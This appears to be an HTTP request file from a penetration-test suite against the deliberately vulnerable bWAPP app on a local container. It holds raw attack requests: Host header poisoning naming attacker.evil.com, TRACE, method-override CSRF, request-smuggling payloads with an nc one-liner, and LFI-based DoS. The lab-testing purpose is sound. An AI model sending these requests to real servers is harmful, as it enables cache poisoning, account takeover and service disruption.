### ============================================================================
### 09 - Host header poisoning and HTTP method tampering (raw requests)
###
###   This file uses deliberately malformed requests, so it is kept separate
###   from the main suites. Most editors' HTTP clients will refuse to send some
###   of these as-is; the ones they do send are the interesting ones.
### ============================================================================

### ---------------------------------------------------------------------------
### HOST-01  Host header poisoning - cache/link poisoning
### ---------------------------------------------------------------------------
GET {{baseUrl}}/hostheader_1.php HTTP/1.1
Host: attacker.evil.com
Cookie: {{authCookie}}
Accept: text/html
### Expected: 200, "attacker.evil.com" appears in every absolute URL in the page


### ---------------------------------------------------------------------------
### HOST-02  X-Forwarded-Host spoofing
###   If the app trusts proxy headers it will believe this over the real Host.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/hostheader_1.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
X-Forwarded-Host: attacker.evil.com
X-Forwarded-For: 203.0.113.9
### Expected: 200 - if the reflected value changes, the proxy headers are trusted


### ---------------------------------------------------------------------------
### HOST-03  Absolute-URI request line (request smuggling / parser confusion)
###   A proxy in front of Apache may forward the absolute URI in the Host line
###   while Apache serves the local vhost - a classic front-end/back-end
###   disagreement. NOT SENT BY THE RUNNER: HttpWebRequest rewrites an absolute
###   request target to origin-form, so it cannot send this as written. Send it
###   with a raw client to test it.
### ---------------------------------------------------------------------------
### SKIP
### RUNNER-CANNOT-SEND: an absolute request target is rewritten to origin-form
GET http://attacker.evil.com/hostheader_1.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
### Expected: 200 - Apache serves the local vhost; a proxy in front of it may not


### ---------------------------------------------------------------------------
### VERB-01  TRACE - should be disabled in production
###   TRACE echoes the request back, including cookies, which is a classic
###   cross-site tracing attempt and a credential-leak vector.
### ---------------------------------------------------------------------------
TRACE {{baseUrl}}/secret.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
### Expected: 405 Method Not Allowed (Apache has TRACE off by default)


### ---------------------------------------------------------------------------
### VERB-02  Method override - PUT on a form endpoint
###   Some frameworks honour X-HTTP-Method-Override. If bWAPP's routing trusts
###   the verb, a state change can be triggered from a page that should only
###   ever produce GET/POST.
###   Observed: Apache and mod_php accept the PUT and the page renders (200), but
###   PHP does not populate $_POST for a PUT, so csrf_1.php changes nothing. The
###   endpoint is verb-agnostic in reach but not in effect - verify by reading
###   the users table afterwards, not by trusting the 200.
### ---------------------------------------------------------------------------
PUT {{baseUrl}}/csrf_1.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
X-HTTP-Method-Override: POST
Content-Type: application/x-www-form-urlencoded

password=pwned&password_conf=pwned&form=submit
### EXPECT-STATUS: 200|405
### EXPECT-NOT: "The password has been changed"
### Expected: 405, or the page renders but the change silently does nothing


### ---------------------------------------------------------------------------
### VERB-03  Method override header on a normal POST
### ---------------------------------------------------------------------------
POST {{baseUrl}}/insecure_direct_object_ref_1.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
X-HTTP-Method-Override: DELETE
Content-Type: application/x-www-form-urlencoded

login=A.I.M.&secret=verb-tampered&action=change
### Expected: 200 - the write happens regardless of the override header,
###           showing the endpoint's authorization is verb-agnostic


### ---------------------------------------------------------------------------
### SM-01  Request smuggling - CL.TE desync attempt
###   Classic Content-Length / Transfer-Encoding disagreement. Documented as a
###   negative result if the server answers 400.
###   NOT SENT BY THE RUNNER: HttpWebRequest owns both headers and rewrites them,
###   so it cannot emit a contradictory pair. Use a raw client:
###     printf 'POST /secret.php HTTP/1.1\r\nHost: localhost:8443\r\nContent-Length: 65\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/ HTTP/1.1\r\nHost: localhost:8443\r\nX-Ignore: x\r\n\r\n' | nc localhost 8443
### ---------------------------------------------------------------------------
### SKIP
### RUNNER-CANNOT-SEND: Content-Length / Transfer-Encoding are rewritten by the client
POST {{baseUrl}}/secret.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Transfer-Encoding: chunked

0

GET /admin/ HTTP/1.1
Host: localhost:8443
X-Ignore: x
### Expected: 400 Bad Request - no desync, Apache 2.4 rejects the ambiguity


### ---------------------------------------------------------------------------
### SM-02  Double Transfer-Encoding header obfuscation
###   Also unsendable by the runner, for the same reason as SM-01.
### ---------------------------------------------------------------------------
### SKIP
### RUNNER-CANNOT-SEND: duplicate framing headers are collapsed by the client
POST {{baseUrl}}/secret.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST /admin/ HTTP/1.1
Content-Length: 15

x=1
0


### Expected: 400/501 - the duplicate header is rejected, not silently merged


### ---------------------------------------------------------------------------
### DOS-01  Resource-exhaustion surface (bWAPP "DoS" bugs)
###   Only send this against the throwaway Docker container. It is here so the
###   report can state the vector exists, not to run it repeatedly.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/sm_dos_1.php HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
### Expected: 200 - resource consumption bug; do not repeat


### ---------------------------------------------------------------------------
### DOS-02  DoS via the included-file bug (LFI to a huge file)
###   Combines LFI-01 with resource use: read a large file to burn worker time.
###   Point `page` at /dev/zero only on a disposable container.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/directory_traversal_1.php?page=/var/www/html/documents/bWAPP_intro.pdf HTTP/1.1
Host: localhost:8443
Cookie: {{authCookie}}
### Expected: 200, a 5 MB PDF read line-by-line and echoed - worker tied up
